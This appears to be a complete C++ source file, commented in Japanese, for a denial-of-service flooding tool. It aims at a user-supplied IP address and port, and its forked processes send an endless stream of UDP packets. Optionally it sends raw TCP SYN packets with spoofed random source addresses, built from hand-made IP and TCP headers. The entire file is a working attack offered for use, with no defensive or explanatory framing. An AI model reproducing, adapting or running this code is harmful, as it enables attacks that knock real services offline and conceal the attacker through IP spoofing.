/*
*  プロキシに通しての実行は出来ないのでご了承ください。
*  もし、プロキシを通したい人がいるなら、ご自分で改造してください。＾＾
*/

#include <cstdio>
#include <cstdlib>
#include <netdb.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <ctype.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <cstring>
#include <errno.h>
#include <ctime>
#include <chrono>
#include <thread>

#define THREADS 10  // <- 好きなように設定してどうぞ

int port{}, dumy{};
const char data[] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                    "AAAAAAAAAAAAAAAAAAAAAAAA";
char packet[] = "GET / HTTP/1.1\r\n\r\n"
                "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0;"
                " Windows NT 5.1;Trident/4.0; .NET CLR 1.1.4322"
                "; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; "
                ".NET CLR 3.5.30729; MSOffice 12)\r\nContent-Le"
                "ngth: \0\r\n";

struct iphdr
{
    unsigned char       ver_and_hdrlen;// バージョン番号とIPヘッダー長
    unsigned char       tos;           // サービスの種類
    unsigned short      total_len;     // 全長
    unsigned short      id;            // IPパケットID
    unsigned short      flags;         // フラグビット（スライスオフセット含む）
    unsigned char       ttl;           // ライフサイクル
    unsigned char       protocol;      // 上位層プロトコル
    unsigned short      checksum;      // チェックサム
    unsigned int        srcaddr;       // 送信元IPアドレス
    unsigned int        dstaddr;       // 対象IPアドレス
};

struct tcphdr
{
    unsigned short      sport;    // ソースポート
    unsigned short      dport;    // 対象ポート
    unsigned int        seq;      // シリアルナンバー
    unsigned int        ack_seq;  // 確認番号
    unsigned char       len;      // 第一部の長さ
    unsigned char       flag;     // ロゴの位置
    unsigned short      win;      // 窓の大きさ
    unsigned short      checksum; // チェックサム
    unsigned short      urg;      // エマージェンシーポインター
};

struct pseudohdr
{
    unsigned int        saddr;
    unsigned int        daddr;
    char                zeros;
    char                protocol;
    unsigned short      length;
};

unsigned short checksum(unsigned short *buffer, unsigned short size)
{
    unsigned long cksum = 0;
    
    while (size > 1) {
        cksum += *buffer++;
        size  -= sizeof(unsigned short);
    }
    
    if (size) {
        cksum += *(unsigned char *)buffer;
    }
    
    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >> 16);
    
    return (unsigned short)(~cksum);
}

void init_ip_header(struct iphdr *ip, unsigned int srcaddr, unsigned int dstaddr)
{
    int len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    
    ip->ver_and_hdrlen = (4<<4 | sizeof(struct iphdr)/sizeof(unsigned int));
    ip->tos = 0;
    ip->total_len = htons(len);
    ip->id = 1;
    ip->flags = 0x40;
    ip->ttl = 255;
    ip->protocol = IPPROTO_TCP;
    ip->checksum = 0;
    ip->srcaddr = srcaddr; // 送信元IPアドレス
    ip->dstaddr = dstaddr; // 対象IPアドレス
}

void init_tcp_header(struct tcphdr *tcp, unsigned short dport)
{
    srand((unsigned)time(NULL));
    tcp->sport = htons(rand() % 16383 + 49152);   // ランダムなポートを生成する
    tcp->dport = htons(dport);                    // 対象ポート
    tcp->seq = htonl(rand() % 90000000 + 2345);   // ランダムな初期化シーケンス番号の生成
    tcp->ack_seq = 0;
    tcp->len = (sizeof(struct tcphdr) / 4 << 4 | 0);
    tcp->flag = 0x02;
    tcp->win = htons(1024);
    tcp->checksum = 0;
    tcp->urg = 0;
}

void init_pseudo_header(struct pseudohdr *pseudo, unsigned int srcaddr, unsigned int dstaddr)
{
    pseudo->zeros = 0;
    pseudo->protocol = IPPROTO_TCP;
    pseudo->length = htons(sizeof(struct tcphdr));
    pseudo->saddr = srcaddr;
    pseudo->daddr = dstaddr;
}

int make_syn_packet(char *packet, int pkt_len, unsigned int daddr, unsigned short dport)
{
    char buf[100];
    int len;
    struct iphdr ip;          //IPヘッド
    struct tcphdr tcp;        //TCPヘッダー
    struct pseudohdr pseudo;  //TCP疑似ヘッダ
    unsigned int saddr = rand();
    
    len = sizeof(ip) + sizeof(tcp);
    
    // ヘッダー情報の初期化
    init_ip_header(&ip, saddr, daddr);
    init_tcp_header(&tcp, dport);
    init_pseudo_header(&pseudo, saddr, daddr);
    
    //IPチェックサムを計算する
    ip.checksum = checksum((u_short *)&ip, sizeof(ip));
    
    // TCPチェックサムの計算
    bzero(buf, sizeof(buf));
    memcpy(buf , &pseudo, sizeof(pseudo));           // TCP擬似ヘッダをコピーする
    memcpy(buf + sizeof(pseudo), &tcp, sizeof(tcp)); // TCPヘッダをコピーする
    tcp.checksum = checksum((u_short *)buf, sizeof(pseudo) + sizeof(tcp));
    
    bzero(packet, pkt_len);
    memcpy(packet, &ip, sizeof(ip));
    memcpy(packet + sizeof(ip), &tcp, sizeof(tcp));
    
    return len;
}

int send_syn_packet(int sockfd, unsigned int *addr, unsigned short port)
{
    struct sockaddr_in skaddr;
    int pkt_len;
    
    bzero(&skaddr, sizeof(skaddr));
    
    skaddr.sin_family = AF_INET;
    skaddr.sin_port = htons(port);
    skaddr.sin_addr.s_addr = *addr;
    
    pkt_len = make_syn_packet(packet, 256, *addr, port);
    
    return sendto(sockfd, packet, pkt_len, 0, (struct sockaddr *)&skaddr, sizeof(struct sockaddr));
}

void syn_attack(unsigned int* addr, char q)
{
    int s{};
    int on = 1;

    int(*F_sock)(int, int, int) = socket;
    int(*F_close)(int) = close;

    while (1) {
        //安全装置
        if (q == 'y') {
            std::this_thread::sleep_for(std::chrono::milliseconds(15));
        }

        //ソケット生成
        if ((s = (*F_sock)(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1) {
            perror("Error");
            exit(1);
        }

        if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on)) < 0) {
            (*F_close)(s);
            perror("Error");
            exit(1);
        }

        //データ送信
        send_syn_packet(s, addr, port);
    }
    (*F_close)(s);
}

void attack(char* str, char q)
{
    int s{};
    struct sockaddr_in addr;

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(str);
    addr.sin_port = htons(port);

    int(*F_sock)(int, int, int) = socket;
    int(*F_close)(int) = close;

    while (1) {
        //安全装置
        if (q == 'y') {
            std::this_thread::sleep_for(std::chrono::milliseconds(15));
        }

        //ソケット生成
        if ((s = (*F_sock)(AF_INET, SOCK_DGRAM, 0)) == -1) {
            perror("Error");
            exit(1);
        }

        //データ送信
        sendto(s, data, sizeof(data), 0, (struct sockaddr*)&addr, sizeof(addr));

        //ソケットを閉じる
        (*F_close)(s);
    }
}

int main(int argc, char* argv[])
{
    if (getuid() != 0) {
        printf("\nsudoを付けて実行をしてね。\n\n");
        return 1;
    }
    else if (argc < 3) {
        printf("\nHow to use: %s <IP_address> <Port_number>\n\n", argv[0]);
        return 1;
    }

    struct hostent* he;
    char* str = NULL;

    //ホスト名をIPアドレスに変換
    if ((he = gethostbyname2(argv[1], AF_INET)) == NULL) {
        perror("Error");
        return 1;
    }
    str = he->h_name;

    try {
        port = atoi(argv[2]);
    }
    catch (...) {
        perror("Error");
        return 1;
    }
    
    if (port < 0 || port > 65535) {
        printf("\nポート番号は0以上、65535以下を入力してね。\n\n");
        return 1;
    }

    char p, q;

    printf("IPを偽装しますか？(y/n)\n");
    scanf("%c", &p);

    printf("安全装置をつけますか？(y/n)\n");
    rewind(stdin);
    scanf(" %c", &q);

    if (p == 'n') {
        int s{};
        struct sockaddr_in addr;

        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = inet_addr(str);
        addr.sin_port = htons(port);

        int(*F_sock)(int, int, int) = socket;
        int(*F_close)(int) = close;

        //ソケット生成
        if ((s = (*F_sock)(AF_INET, SOCK_DGRAM, 0)) == -1) {
            perror("Error");
            return 1;
        }

        //データ送信
        sendto(s, data, sizeof(data), 0, (struct sockaddr*)&addr, sizeof(addr));

        //ソケットを閉じる
        (*F_close)(s);

        printf("\n神降臨\n\nTashiro attacking the %s.(To stop, press C + Ctrl)\n\n", str);

        void(*f)(char*, char) = &attack;

        //攻撃
        for (int i = 0; i != THREADS; i++) {
            if (fork()) {
                (*f)(str, q);
            }
        }
    }
    else {
        int s{};
        int on = 1;

        unsigned int addr = inet_addr(argv[1]);

        int(*F_sock)(int, int, int) = socket;
        int(*F_close)(int) = close;

        //ソケット生成
        if ((s = (*F_sock)(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1) {
            perror("Error");
            return 1;
        }

        if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on)) < 0) {
            (*F_close)(s);
            perror("Error");
            return 1;
        }

        //データ送信
        send_syn_packet(s, &addr, port);

        printf("\n神降臨\n\nTashiro attacking the %s.(To stop, press C + Ctrl)\n\n", str);
        
        //攻撃
        for (int j = 0; j != THREADS; j++) {
            if (fork()) {
                syn_attack(&addr, q);
            }
        }
    }

    return 0;
}
